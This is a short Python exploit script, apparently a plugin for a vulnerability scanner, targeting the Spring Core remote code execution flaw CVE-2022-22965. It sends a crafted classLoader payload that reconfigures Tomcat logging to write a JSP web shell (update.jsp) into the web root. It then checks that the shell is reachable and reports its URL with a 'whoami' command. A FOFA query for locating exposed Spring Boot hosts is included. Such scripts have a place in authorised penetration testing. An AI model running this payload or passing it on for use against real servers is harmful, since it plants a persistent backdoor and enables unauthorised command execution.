#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
from urllib.parse import urljoin

import requests
from Config.config_requests import ua

requests.packages.urllib3.disable_warnings()


########################################################################################################################
# 脚本信息
NAME='CVE_2022_22965'
AUTHOR="RabbitMask"
REMARK='Spring Core RCE'
FOFA_RULE='app="vmware-SpringBoot-Framework"'
########################################################################################################################

headers = {"suffix": "%>//",
           "c1": "Runtime",
           "c2": "<%",
           "DNT": "1",
           "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent":ua
           }
# 漏洞检测模块
def poc(target):
    result={}
    data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22update%22.equals(request.getParameter(%22p%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22search%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=update&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    try:
        go = requests.post(target, headers=headers, data=data, timeout=5, allow_redirects=False, verify=False)
        shellurl = urljoin(target, 'update.jsp')
        shellgo = requests.get(shellurl, timeout=5, allow_redirects=False, verify=False)
        if shellgo.status_code == 200 and '401' not in shellgo.text:
            result['target'] = target
            result['poc'] = NAME
            result['shell地址'] = f"{shellurl}?p=update&search=whoami"
            return result
    except:
        pass


if __name__ == '__main__':
    poc('http://127.0.0.1')